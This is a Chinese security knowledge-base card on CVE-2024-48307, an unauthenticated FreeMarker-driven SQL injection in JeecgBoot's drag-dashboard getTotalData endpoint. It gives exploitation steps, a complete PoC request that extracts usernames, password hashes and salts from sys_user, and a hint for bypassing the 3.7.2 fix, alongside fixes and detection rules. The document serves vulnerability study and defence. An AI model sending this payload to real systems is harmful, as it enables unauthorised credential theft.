---
id: web-java-framework-jeecgboot-drag-gettotaldata-freemarker-sqli
title: JeecgBoot 拖拽数据集 /drag/onlDragDatasetHead/getTotalData 未授权：tableName 与 config.fieldName 经 FreeMarker 模板拼入 SELECT，直接读取用户口令列
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-drag-gettotaldata-freemarker-sqli
tags:
- java
- jeecgboot
- jimureport
- sqli
- freemarker
- unauth
- low-code
- cve-2024-48307
cve:
- CVE-2024-48307
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: org.jeecgframework.boot:jeecg-boot-parent < 3.7.1
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-07T23:44:12+08:00'
  notes: 已对照 content.md 与 img/01-08 核对：img/02 ShiroConfig 的 filterChainDefinitionMap.put(/drag/onlDragDatasetHead/getTotalData,anon) 与卡内一致；img/03 Controller @PostMapping(/**/getTotalData) 取 tableName/compName/condition/config、经 onlDragTokenClient.getToken()+getUserInfo() 得 var9、compName=JPivotTable 走 getTableTotalData 否则 getTotalData(var3..var6,var9)；img/04 调试器 var3=sys_user/var4=test/var6=config(assistValue/name/value/type)、var9=OnlDragLoginUserVo 全 null（异物证未授权成立）；img/05 getTotalData 按 formType=design 分流；img/06 querySqlData->handleOnlineForm->onlDragDatasourceDao.selectListBySql 与模板 ${} 拼接点；img/07 调用栈 handleOnlineForm:80->querySqlData:55->getTotalData:673；img/08 3.7.1 靶场成功响应 chartData 中键为 concat(username,0x3a,password,0x3a,salt)、值为 admin:cb362cfeefbf3d8d:RCGTeGiH。已把卡内『JmSqlInjectionException』更正为原文实际异常名 JimuSqlInjectionException(img/09 原文完整名 org.jeecg.modules.jmreport.common.excepiton.JimuSqlInjectionException)。CVE-2024-48307 与 affected_versions org.jeecgframework.boot:jeecg-boot-parent<3.7.1
    均与原文「二、影响版本」逐字一致。未在本机搭靶场、未发送原文任何请求。
url: /docs/web/java/framework/web-java-framework-jeecgboot-drag-gettotaldata-freemarker-sqli/
draft: false
kb_aliases:
- CVE-2024-48307
- JeecgBoot 拖拽仪表盘 SQL 注入
- onlDragDatasetHead getTotalData
- getTotalData 注入
- selectListBySql
- FreeMarker 查询字段名注入
- JimuSqlInjectionException
---

## 一句话结论

JeecgBoot 的 `POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData` 被 Shiro 显式配成 `anon`，请求体中的 `tableName`、`config.name[].fieldName`、`config.value[].fieldName`、`config.typeField`、`queryFields.sorts.field/type`、`timeCondition.*` 等值被 FreeMarker 当作 `${}` 插值渲染成 SQL 后交给 `selectListBySql` 执行，未认证攻击者只要让 `compName` 不等于 `JPivotTable`、`config.formType` 不等于 `design`，就能把任意列名（甚至额外表/函数）拼进 SELECT 列表，直接读到 `sys_user` 的 `username`/`password`/`salt`。

## 原理

- Shiro 配置里 `filterChainDefinitionMap.put("/drag/onlDragDatasetHead/getTotalData","anon")` 明确把该接口列为匿名放行；它不在需要 token 的路径集合中，所以无需登录即可进入。
- Controller（`org.jeecg.modules.drag.b.f#getTotalData`）从 `@RequestBody JSONObject` 里直接取 `tableName`、`compName`、`condition`、`config`，再取 `X-Access-Token` 换取 `OnlDragLoginUserVo`；判断 `"JPivotTable".equals(compName)` 走 `getTableTotalData`，否则走 `getTotalData(var3=tableName, var4=compName, var5=condition, var6=config, var9=user)`。`var9` 在未登录时为全 null 的 VO，代码不因其为空而拒绝请求。
- 服务层 `org.jeecg.modules.drag.service.a#getTotalData` 取 `config.getString("formType")`：为 `design` 时走 `queryMongodbData`（不碰 SQL），否者走 `querySqlData`。所以攻击者只要不给 `formType` 或给它任意非 `design` 值，就能把请求引到 SQL 分支。
- `querySqlData` → `a.i#handleOnlineForm`：`org.jeecg.modules.drag.e.a.d(config)` 把 `config` 里的 `name`/`value`/`type`/`sorts` 等数组重排成 `queryFields`（含 `valueFields`、`nameField`、`typeField`、`sorts`），`org.jeecg.modules.drag.e.a.a(condition)` 生成 `timeCondition`，随后调用 `this.onlDragDatasourceDao.selectListBySql(tableName, queryFields, timeCondition)`。
- `selectListBySql` 的实现是从 `OnlDragDataSourceDao_*.sql` 读入的 FreeMarker 模板，模板里全是裸 `${}`：
  - 值列：`${field.formula}(${field.statisticaField}) ${field.alias}`（`field.formula` 默认 `sum`，但值来自请求 JSON）；
  - 名称列：`${queryFields.nameField}`、`${queryFields.nameField} as name`；
  - 类型列：`${queryFields.typeField}`；
  - 表名：`FROM ${tableName}`；
  - 时间条件：`${timeCondition.timeField} between '${timeCondition.timeBegin}' and '${timeCondition.timeEnd}'`；
  - 排序：`ORDER BY ${queryFields.sorts.field} ${queryFields.sorts.type}`。
- 为什么成立：FreeMarker 渲染发生在 SQL 执行之前，渲染结果就是最终 SQL 字符串；模板没有做任何引号/白名单处理，于是“请求 JSON 里的字段名”等价于“SQL 片段”。字段名出现在 SELECT 列表、FROM、WHERE、GROUP BY、ORDER BY 五个位置，任一处都可注入。
- 危害为什么是“直接拖库”而不是盲注：注入点就在 SELECT 输出列上，把 `concat(username,0x3a,password,0x3a,salt)` 塞进 `fieldName`，渲染后该表达式成为查询列，其结果随 `chartData`/`rawData` 一起回显（实测返回 `admin:cb362cfeefbf3d8d:RCGTeGiH` 这类拼接串），一次请求即拿到账号与口令哈希，不需要 oracle。
- 版本线索：`jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar` 内的 `org.jeecg.modules.drag.*` 承载该路由；受影响坐标为 `org.jeecgframework.boot:jeecg-boot-parent < 3.7.1`。

## 触发条件

- 目标运行 JeecgBoot < 3.7.1（含 `jimureport-dashboard-spring-boot-starter` 拖拽仪表盘模块），且 `ShiroConfig` 未移除该 `anon` 规则。
- 攻击者能访问 `/jeecg-boot/drag/onlDragDatasetHead/getTotalData`（默认无需任何 token）。
- 请求体 JSON 可控制 `tableName` 与 `config.name[].fieldName`（`compName` 取任意非 `JPivotTable` 值，`config` 不带 `formType` 或 `formType != design`）。
- 数据库为 MySQL/MariaDB 等支持 `concat()`、`0x` 十六进制字面量的库（原文环境为 MySQL）。

## 利用步骤

1. 确认接口存在且匿名可达：直接 POST 一个 `{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{...}}`，观察是否返回 `{"success":true,"code":200,"result":{...}}`（不需要任何 Cookie/Token 头）。
2. 把目标表达式写进 `config.name[0].fieldName`（会被拼成 `nameField` 输出列），`config.name[1].fieldName` 放一个正常列（如 `id`）以满足模板对第二段的渲染。
3. 发送后从响应 `result.chartData`/`result.rawData` 中读取注入列的值；若列名带特殊字符，响应会把表达式原样作为 key（如 `"concat(username,0x3a,password,0x3a,salt)": "admin:cb...:RCGTeGiH"`）。
4. 换 `tableName` 与表达式即可横向读取其它表（`sys_dict`、`sys_role`、业务表等）；也可把 `fieldName` 换成子查询/函数表达式以做报错或布尔判断。
5. 拿到 `password`/`salt` 后按 JeecgBoot 的存储方式（MD5 加盐）离线还原，或直接用 `concat` 读 `id`/`username` 做账号枚举。

## PoC

```http
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: 127.0.0.1:12345
Content-Type: application/json
Content-Length: 326

{"tableName": "sys_user", "compName": "test", "condition": {"filter": {}}, "config": {"assistValue": [], "assistType": [], "name": [{"fieldName": "concat(username,0x3a,password,0x3a,salt)", "fieldType": "string"}, {"fieldName": "id", "fieldType": "string"}], "value": [{"fieldName": "id", "fieldType": "string"}], "type": []}}
```

```text
# 渲染后的 SQL 片段（FreeMarker 模板展开，节选）：
# SELECT
#   concat(username,0x3a,password,0x3a,salt), id,
#   concat(username,0x3a,password,0x3a,salt) as name
# FROM sys_user
# ...
# 响应 result.chartData 中直接出现 "admin:cb362cfeefbf3d8d:RCGTeGiH"
```

## 变体与关联

- 变体：把 payload 放 `tableName`（`FROM ${tableName}`）或 `config.sorts.field/type`（`ORDER BY ${...}`），后者在只允许正常列名的场景更隐蔽。
- 变体：`compName` 取 `JPivotTable` 会切到 `getTableTotalData` 分支，可另行审计该分支是否同样拼接。
- 变体：`config.formType=design` 会切到 MongoDB 分支，可用来探测后端数据源类型。
- 变体：3.7.2 起加入 `concat` 检测（`JimuSqlInjectionException`），可用“逗号分隔的裸列名”改写绕过，见 [[web-java-framework-jeecgboot-jimureport-comma-field-concat-check-bypass]]。
- 关联：[[web-java-framework-jeecgboot-dict-filter-sql-injection]]、[[web-java-component-jimureport-queryfieldbysql-time-blind-sqli]]（同一产品族里“用户可控字段名进 ${}”的其它入口）。
- 边界：3.7.1 及以上版本（尤其 3.7.2 起）对该字段加了反射式 SQL 注入校验，原 payload 会返回 `JimuSqlInjectionException: 字段不合法，存在SQL注入风险`；`ShiroConfig` 若收紧了该路径的 `anon` 规则则未授权入口消失；`formType=design` 或 `compName=JPivotTable` 时不走本条链。

## 检测与防御

- 修复：升级到 ≥ 3.7.2（并确认 `JimuSqlInjectionException` 校验覆盖 `tableName`/`fieldName`/`sorts`/`timeCondition` 全部插值点）；根本方案是把表名/字段名改成服务端白名单映射，条件值用参数化，禁止用 FreeMarker 渲染 SQL。
- 加固：把 `/drag/onlDragDatasetHead/getTotalData` 从 Shiro `anon` 名单移出，要求登录且校验数据源权限；对 `config.name[].fieldName` 只允许 `[A-Za-z0-9_]` 且必须命中已知列清单。
- 检测：单个请求体同时含 `tableName` 与 `config.name[].fieldName`，且 fieldName 出现 `(`、`,`、`0x`、`concat`、`select`、`case`、`union`；响应 `result.chartData` 的 key 不是数据库列名而是表达式；同一路径高频匿名 POST；数据库审计日志里出现带 `concat(username,...)` 的 SELECT。
